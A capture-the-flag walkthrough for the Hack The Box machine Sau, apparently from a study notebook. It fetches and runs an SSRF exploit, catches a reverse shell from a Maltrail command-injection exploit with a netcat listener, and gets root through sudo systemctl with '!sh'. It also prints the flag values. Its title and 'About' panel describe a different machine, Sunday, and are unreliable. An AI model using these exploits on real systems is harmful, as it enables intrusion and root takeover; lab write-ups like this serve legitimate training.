---
description: https://www.hackthebox.com/machines/sunday
---

# Sunday

🔗 [Sunday](https://www.hackthebox.com/machines/sunday)

<div align="left">

<figure><img src="../.gitbook/assets/image (1).png" alt="" width="150"><figcaption><p>@hackthebox.com</p></figcaption></figure>

</div>

<details>

<summary>About</summary>

### Machine Description

Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials.

### Area of Interest

Enterprise Network Protocols Vulnerability Assessment Authentication

### Technology

SSH Finger

### Vulnerabilities

Weak Credentials Misconfiguration

### Security Tools

Nmap Zenmap John finger-user-enum

### Techniques

Reconnaissance User Enumeration Password Cracking Brute Force Attack SUDO Exploitation

</details>

## Task 0 - Deploy machine

🎯 Target IP: `10.129.229.26`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "10.129.229.26 sau.htb" >> /etc/hosts
</strong>
mkdir -p htb/sau.htb
cd htb/sau.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 sau.htb
PING sau.htb (10.129.229.26) 56(84) bytes of data.
64 bytes from sau.htb (10.129.229.26): icmp_seq=1 ttl=63 time=61.0 ms
64 bytes from sau.htb (10.129.229.26): icmp_seq=2 ttl=63 time=59.5 ms
64 bytes from sau.htb (10.129.229.26): icmp_seq=3 ttl=63 time=60.0 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a \*nix system, while Windows systems usually have a TTL of 128 secs.

### 1.1 - Which is the highest open TCP port on the target machine?

```bash
nmap -p0- -sS -Pn -vvv sau.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open TCP ports on the machine: 22, 55555 and 2 filtered TCP ports: 80, 8338.

{% hint style="info" %}
55555
{% endhint %}

### 1.2 - What is the name of the open source software that the application on 55555 is "powered by"?

Then, we can proceed to analyze services active on open ports:

```bash
nmap -p22,55555 -sS -Pn -n -v -sCV -T4 sau.htb -oN nmap/service_port_scan
```

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 09 Nov 2024 14:27:59 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 09 Nov 2024 14:27:33 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 09 Nov 2024 14:27:33 GMT
|_    Content-Length: 0
```

Strangely enough, port 80 is filtered, but there seems to be some relationship with the service active on port 55555, let's go and see.

Browsing it:  [`http://sau.htb:55555/web`](http://sau.htb:55555/web)  we see that there's up a web app to create a basket to collect and inspect HTTP requests. using request-baskets app vs 1.2.1.

<figure><img src="../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

```bash
whatweb sau.htb:55555
http://sau.htb:55555 [302 Found] Country[RESERVED][ZZ], IP[10.129.229.26], RedirectLocation[/web]
http://sau.htb:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.129.229.26], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

```bash
gobuster dir -u http://sau.htb:55555 -w /usr/share/wordlists/dirb/common.txt
```

We discover only this web dir: `/web (Status: 200)` that unfortunely corrispond to our index page.

{% hint style="info" %}
request-baskets
{% endhint %}

### 1.3 - What is the version of request-baskets running on Sau?

<div align="left">

<figure><img src="../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
1.2.1
{% endhint %}

## Task 2 - Find user flag

### 2.1 -  What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?

Googling 'request-baskets 1.2.1' we discover that's vulnerable to a recent CVE via an [SSRF](https://portswigger.net/web-security/ssrf) attack.

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-27163" %}

{% embed url="https://github.com/entr0pie/CVE-2023-27163" %}

{% hint style="info" %}
CVE-2023-27163
{% endhint %}

After understanding [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and reading details regarding usage:

<figure><img src="../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

we can download CVE-2023-27163.sh and execute it exploiting our vulnerability:

```bash
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80
```

<figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

and now we can concatenate basket value to our URL and finally reach filtered port 80: [http://sau.htb:55555/hbvoml](http://sau.htb:55555/hbvoml)

<figure><img src="../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

![](<../.gitbook/assets/image (354).png>)\


{% hint style="info" %}
maltrail
{% endhint %}

### 2.2 -  There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path targeted by this exploit?

\
Googling 'MailTrail v0.53' we discover that's vulnerable to an unauthenticated OS Command Injection (RCE)

{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}

the `username` parameter of the **login page** doesn't properly sanitize the input, allowing an attacker to inject OS commands.

The exploit creates a reverse shell payload encoded in Base64 to bypass potential protections like WAF, IPS or IDS and delivers it to the target URL using a curl command The payload is then executed on the target system, establishing a reverse shell connection back to the attacker's specified IP and port.

<figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

Attacker machine:

```bash
#first check our IP using ip a
nc -nvlp 4444
```

Target Machine

```bash
python3 exploit.py 10.10.14.6 4444 http://sau.htb:55555/hbvoml
```

<figure><img src="../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/login
{% endhint %}

### 2.3 -  What user is the Mailtrack application running as on Sau?

Taking a little system enumeration (whoami and/or id) we can check user active on machine

<div align="left">

<figure><img src="../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
puma
{% endhint %}

### 2.4 - Submit the flag located in the puma user's home directory.

```bash
cd ~
ll
cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

8fa7f7719f0e91d9d63187d1b074c457

</details>

## Task 3 - Find root flag

### 3.1 - What is the full path to the application the user puma can run as root on Sau?

Very good, we can proceed with privilege escalation for obtaining the root flag.

Executing `sudo -l` command we can commands that user puma can execute with sudo privileges

<figure><img src="../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/usr/bin/systemctl
{% endhint %}

### 3.2 - What is the full version string for the instance of systemd installed on Sau?

We know that systemctl is a service associated at process systemd, we can search version digiting: `systemctl --version`

<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
systemd 245 (245.4-4ubuntu3.22)
{% endhint %}

### 3.3 - What is the CVE ID for a local privilege escalation vulnerability that affects that particular systemd version?

Googling 'usr/bin/systemctl status trail.service', we discover this CVE:

{% embed url="https://nvd.nist.gov/vuln/detail/cve-2023-26604" %}

and this useful resource:&#x20;

{% embed url="https://securityonline.info/cve-2023-26604-systemd-privilege-escalation-flaw-affects-linux-distros/" %}

then, only executing: `sudo /usr/bin/systemctl status trail.service`

and adding `!sh`  we can spawn a new shell, directly with root privileges.

<div align="left">

<figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
CVE-2023-26604
{% endhint %}

### 3.4 - Submit the flag located in the root user's home directory.

Let's go into root folder for catching root flag!

![](<../.gitbook/assets/image (363).png>)\


<details>

<summary>🚩 Flag 2 (root.txt)</summary>

c4fc01d4944cf3925f079da70abdaea7

</details>

<figure><img src="../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>
